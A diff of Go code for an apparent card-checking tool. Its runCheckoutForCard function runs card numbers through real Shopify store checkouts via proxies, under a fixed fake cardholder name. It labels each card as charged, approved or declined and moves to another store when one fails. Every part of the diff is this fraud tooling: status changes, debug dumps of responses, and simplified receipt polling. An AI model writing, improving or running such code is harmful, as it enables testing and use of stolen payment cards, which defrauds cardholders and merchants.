-	if hasCurrencyNotSupportedError(proposal2Body) {
-		result.Status = CheckError
-		result.StatusCode = "CURRENCY_NOT_SUPPORTED"
-		result.Error = errCurrencyNotSupported
-		return result, result.Error
-	}
+	saveDebugResponse("proposal2", proposal2Body)
 	queueToken2 := extractQueueToken(proposal2Body)
 	if queueToken2 == "" {
-		result.Status = CheckError
+		result.Status = StatusError
 		result.Error = fmt.Errorf("Step 5 failed: could not extract queueToken")
 		return result, result.Error
 	}
@@ -1842,19 +2176,14 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 	addr := addressForCountry(country)
 	_, proposal3Body, err := sendProposal3(client, shopURL, checkoutURL, checkoutToken, sessionToken, stableID, variantID, price, proposalID, buildID, sourceToken, queueToken2, email, addr, currency, country)
 	if err != nil {
-		result.Status = CheckError
+		result.Status = StatusError
 		result.Error = fmt.Errorf("Step 6 failed: %w", err)
 		return result, result.Error
 	}
-	if hasCurrencyNotSupportedError(proposal3Body) {
-		result.Status = CheckError
-		result.StatusCode = "CURRENCY_NOT_SUPPORTED"
-		result.Error = errCurrencyNotSupported
-		return result, result.Error
-	}
+	saveDebugResponse("proposal3", proposal3Body)
 	queueToken3 := extractQueueToken(proposal3Body)
 	if queueToken3 == "" {
-		result.Status = CheckError
+		result.Status = StatusError
 		result.Error = fmt.Errorf("Step 6 failed: could not extract queueToken")
 		return result, result.Error
 	}
@@ -1863,19 +2192,14 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 	time.Sleep(200 * time.Millisecond)
 	_, proposal4Body, err := sendProposal3(client, shopURL, checkoutURL, checkoutToken, sessionToken, stableID, variantID, price, proposalID, buildID, sourceToken, queueToken3, email, addr, currency, country)
 	if err != nil {
-		result.Status = CheckError
+		result.Status = StatusError
 		result.Error = fmt.Errorf("Step 7 failed: %w", err)
 		return result, result.Error
 	}
-	if hasCurrencyNotSupportedError(proposal4Body) {
-		result.Status = CheckError
-		result.StatusCode = "CURRENCY_NOT_SUPPORTED"
-		result.Error = errCurrencyNotSupported
-		return result, result.Error
-	}
+	saveDebugResponse("proposal4", proposal4Body)
 	queueToken4 := extractQueueToken(proposal4Body)
 	if queueToken4 == "" {
-		result.Status = CheckError
+		result.Status = StatusError
 		result.Error = fmt.Errorf("Step 7 failed: could not extract queueToken")
 		return result, result.Error
 	}
@@ -1884,22 +2208,17 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 	time.Sleep(200 * time.Millisecond)
 	proposal5Status, proposal5Body, err := sendProposal3(client, shopURL, checkoutURL, checkoutToken, sessionToken, stableID, variantID, price, proposalID, buildID, sourceToken, queueToken4, email, addr, currency, country)
 	if err != nil {
-		result.Status = CheckError
+		result.Status = StatusError
 		result.Error = fmt.Errorf("Step 8 failed: %w", err)
 		return result, result.Error
 	}
 	_ = proposal5Status
-	if hasCurrencyNotSupportedError(proposal5Body) {
-		result.Status = CheckError
-		result.StatusCode = "CURRENCY_NOT_SUPPORTED"
-		result.Error = errCurrencyNotSupported
-		return result, result.Error
-	}
+	saveDebugResponse("proposal5", proposal5Body)
 
 	// Step 9
 	identSig := extractIdentificationSignature(checkoutHTML)
 	if identSig == "" {
-		result.Status = CheckError
+		result.Status = StatusError
 		result.Error = fmt.Errorf("Step 9 failed: could not extract identification signature")
 		return result, result.Error
 	}
@@ -1907,14 +2226,15 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 	pciStatus, pciBody, err := sendPCISession(identSig, cardNumber, "james anderson", cardMonth, cardYear, cardCVV, siteName, proxyURL)
 	_ = pciStatus
 	if err != nil {
-		result.Status = CheckError
+		result.Status = StatusError
 		result.Error = fmt.Errorf("Step 9 failed: %w", err)
 		return result, result.Error
 	}
+	saveDebugResponse("pci_session", pciBody)
 
 	pciSessionID := extractPCISessionID(pciBody)
 	if pciSessionID == "" {
-		result.Status = CheckError
+		result.Status = StatusError
 		result.Error = fmt.Errorf("Step 9 failed: could not extract session ID")
 		return result, result.Error
 	}
@@ -1922,27 +2242,27 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 	// Step 10
 	queueToken5 := extractQueueToken(proposal5Body)
 	if queueToken5 == "" {
-		result.Status = CheckError
+		result.Status = StatusError
 		result.Error = fmt.Errorf("Step 10 failed: could not extract queueToken")
 		return result, result.Error
 	}
 	deliveryHandle := extractDeliveryHandle(proposal5Body)
 	if deliveryHandle == "" {
-		result.Status = CheckError
+		result.Status = StatusError
 		result.Error = fmt.Errorf("%w: Step 10 failed: could not extract delivery handle", errStoreIncompatible)
 		result.Retryable = true
 		return result, result.Error
 	}
 	signedHandles := extractSignedHandles(proposal5Body)
 	if len(signedHandles) == 0 {
-		result.Status = CheckError
+		result.Status = StatusError
 		result.Error = fmt.Errorf("%w: Step 10 failed: could not extract signedHandles", errStoreIncompatible)
 		result.Retryable = true
 		return result, result.Error
 	}
 	shippingAmount := extractShippingAmount(proposal5Body)
 	if shippingAmount == "" {
-		result.Status = CheckError
+		result.Status = StatusError
 		result.Error = fmt.Errorf("%w: Step 10 failed: could not extract shipping amount", errStoreIncompatible)
 		result.Retryable = true
 		return result, result.Error
@@ -1952,7 +2272,7 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 		totalAmount = extractSellerTotal(proposal5Body)
 	}
 	if totalAmount == "" {
-		result.Status = CheckError
+		result.Status = StatusError
 		result.Error = fmt.Errorf("Step 10 failed: could not extract total amount")
 		return result, result.Error
 	}
@@ -1967,93 +2287,33 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 		deliveryHandle, shippingAmount, totalAmount,
 		pciSessionID, attemptToken, currency, country,
 		signedHandles,
-		cardNumber, paymentMethodID,
 	)
 	_ = submitStatus
 	if err != nil {
-		result.Status = CheckError
+		result.Status = StatusError
 		result.Error = fmt.Errorf("Step 10 failed: %w", err)
 		return result, result.Error
 	}
+	saveDebugResponse("submit", submitBody)
 	checkSubmitErrors(submitStatus, submitBody)
 
 	receiptID := extractReceiptID(submitBody)
 	if receiptID == "" {
-		// No receipt ID — check if submit returned explicit errors (fraud, decline, validation)
-		submitErrs := proposalErrorRe.FindAllStringSubmatch(submitBody, -1)
-		for _, m := range submitErrs {
-			code := m[1]
-			msg := m[2]
-			fmt.Printf("  [SUBMIT] Error: %s — %s\n", code, msg)
-			switch code {
-			case "VALIDATION_CUSTOM":
-				result.Status = StatusDeclined
-				result.StatusCode = "VALIDATION_CUSTOM"
-				if strings.Contains(strings.ToLower(msg), "fraud") {
-					result.StatusCode = "FRAUD_SUSPECTED"
-				}
-				result.Error = fmt.Errorf("declined: %s", msg)
-				return result, result.Error
-			case "CARD_DECLINED", "INSUFFICIENT_FUNDS", "EXPIRED_CARD",
-				"INCORRECT_NUMBER", "INVALID_CVC", "CARD_VELOCITY_EXCEEDED":
-				result.Status = StatusDeclined
-				result.StatusCode = code
-				result.Error = fmt.Errorf("declined: %s", code)
-				return result, result.Error
-			default:
-				result.Status = StatusDeclined
-				result.StatusCode = code
-				result.Error = fmt.Errorf("submit error: %s — %s", code, msg)
-				return result, result.Error
-			}
-		}
-		// No structured errors found — generic missing receipt
-		result.Status = CheckError
+		result.Status = StatusError
 		result.Error = fmt.Errorf("%w: Step 10 failed: could not extract receiptId", errMissingReceiptID)
 		result.Retryable = true
 		return result, result.Error
 	}
 	receiptSessionToken := extractReceiptSessionToken(submitBody)
 	if receiptSessionToken == "" {
-		result.Status = CheckError
+		result.Status = StatusError
 		result.Error = fmt.Errorf("Step 10 failed: could not extract sessionToken")
 		return result, result.Error
 	}
 
-	// Step 11 — Extract receipt type from SubmitForCompletion response first
-	// If we already have a final status, skip polling
-	typeNameRe := regexp.MustCompile(`"__typename"\s*:\s*"(ProcessingReceipt|FailedReceipt|SuccessfulReceipt|ProcessedReceipt|ActionRequiredReceipt)"`)
-	initialReceiptType := ""
-	if m := typeNameRe.FindStringSubmatch(submitBody); len(m) > 1 {
-		initialReceiptType = m[1]
-	}
-
-	// If submit response already has a final receipt type (not Processing), use it directly
-	if initialReceiptType == "SuccessfulReceipt" || initialReceiptType == "ProcessedReceipt" ||
-		initialReceiptType == "FailedReceipt" || initialReceiptType == "ActionRequiredReceipt" {
-		fmt.Printf("  [SUBMIT] Final receipt type: %s (no polling needed)\n", initialReceiptType)
-		statusCode := extractReceiptStatusCode(submitBody, initialReceiptType)
-		result.StatusCode = statusCode
-
-		if initialReceiptType == "SuccessfulReceipt" || initialReceiptType == "ProcessedReceipt" {
-			result.Status = StatusCharged
-			result.StatusCode = "ORDER_PLACED"
-			return result, nil
-		}
-		if initialReceiptType == "ActionRequiredReceipt" {
-			result.Status = StatusApproved
-			result.StatusCode = "APPROVED"
-			return result, nil
-		}
-		if initialReceiptType == "FailedReceipt" {
-			result.Status = StatusDeclined
-			result.StatusCode = "FAILED"
-			return result, nil
-		}
-	}
-
-	// Only poll if receipt type is ProcessingReceipt (pending)
+	// Step 11 — Poll for receipt
 	pollDelayRe := regexp.MustCompile(`"pollDelay"\s*:\s*(\d+)`)
+	typeNameRe := regexp.MustCompile(`"__typename"\s*:\s*"(ProcessingReceipt|FailedReceipt|SuccessfulReceipt|ProcessedReceipt|ActionRequiredReceipt)"`)
 	for pollNum := 1; ; pollNum++ {
 		_, pollBody, err := sendPollForReceipt(
 			client, shopURL, checkoutURL, checkoutToken, sessionToken,
@@ -2061,7 +2321,7 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 			pollForReceiptID, receiptID, receiptSessionToken,
 		)
 		if err != nil {
-			result.Status = CheckError
+			result.Status = StatusError
 			result.Error = fmt.Errorf("poll %d failed: %w", pollNum, err)
 			return result, result.Error
 		}
@@ -2073,47 +2333,16 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 		statusCode := extractReceiptStatusCode(pollBody, receiptType)
 		result.StatusCode = statusCode
 
+		saveDebugResponse(fmt.Sprintf("poll%d", pollNum), pollBody)
 		fmt.Printf("  [POLL %d] receiptType=%q statusCode=%q\n", pollNum, receiptType, statusCode)
 
-		// Detect GraphQL schema mismatch (store running incompatible Shopify version) — use SubmitForCompletion result as fallback
+		// Detect GraphQL schema mismatch (store running incompatible Shopify version) — retry on another site
 		if receiptType == "" && strings.Contains(pollBody, `"errors"`) && strings.Contains(pollBody, "undefinedField") {
-			// Fall back to initial receipt type from submit if available
-			if initialReceiptType != "" {
-				fmt.Printf("  [POLL] Schema error, using SubmitForCompletion result: %s\n", initialReceiptType)
-				statusCode := extractReceiptStatusCode(submitBody, initialReceiptType)
-				result.StatusCode = statusCode
-
-				// Accept the SubmitForCompletion result as final
-				// (charge was already authorized, we just can't poll the status)
-				if initialReceiptType == "ActionRequiredReceipt" {
-					result.Status = StatusApproved
-					result.StatusCode = "APPROVED"
-					return result, nil
-				}
-				if initialReceiptType == "SuccessfulReceipt" {
-					result.Status = StatusCharged
-					result.StatusCode = "ORDER_PLACED"
-					return result, nil
-				}
-				if initialReceiptType == "ProcessingReceipt" {
-					// Payment is in-flight — not yet confirmed as placed
-					result.Status = StatusApproved
-					result.StatusCode = "PROCESSING"
-					return result, nil
-				}
-				if initialReceiptType == "FailedReceipt" {
-					result.Status = StatusDeclined
-					result.StatusCode = "FAILED"
-					return result, nil
-				}
-			} else {
-				// No fallback available, mark as schema mismatch
-				result.Status = CheckError
-				result.StatusCode = "SCHEMA_MISMATCH"
-				result.Retryable = true
-				result.Error = fmt.Errorf("%w: poll %d: GraphQL schema mismatch on this store", errStoreIncompatible, pollNum)
-				return result, result.Error
-			}
+			result.Status = StatusError
+			result.StatusCode = "SCHEMA_MISMATCH"
+			result.Retryable = true
+			result.Error = fmt.Errorf("%w: poll %d: GraphQL schema mismatch on this store", errStoreIncompatible, pollNum)
+			return result, result.Error
 		}
 
 		if receiptType == "SuccessfulReceipt" || receiptType == "ProcessedReceipt" {
@@ -2146,7 +2375,7 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 				return result, nil
 			case "CAPTCHA_REQUIRED":
 				result.Status = StatusDeclined
-				result.StatusCode = "CARD_DECLINED"
+				result.StatusCode = errorCode
 				result.Error = fmt.Errorf("declined: %s", errorCode)
 				return result, result.Error
 			case "GENERIC_ERROR":
@@ -2157,7 +2386,7 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 			default:
 				// Check for InventoryReservationFailure (no code field)
 				if strings.Contains(pollBody, "InventoryReservationFailure") {
-					result.Status = CheckError
+					result.Status = StatusError
 					result.StatusCode = "INVENTORY_FAILURE"
 					result.Retryable = true
 					result.Error = fmt.Errorf("retryable: inventory reservation failure")
@@ -2180,7 +2409,7 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 		time.Sleep(time.Duration(delay) * time.Millisecond)
 
 		if pollNum >= 60 {
-			result.Status = CheckError
+			result.Status = StatusError
 			result.Error = fmt.Errorf("exceeded 60 poll attempts")
 			return result, result.Error
 		}
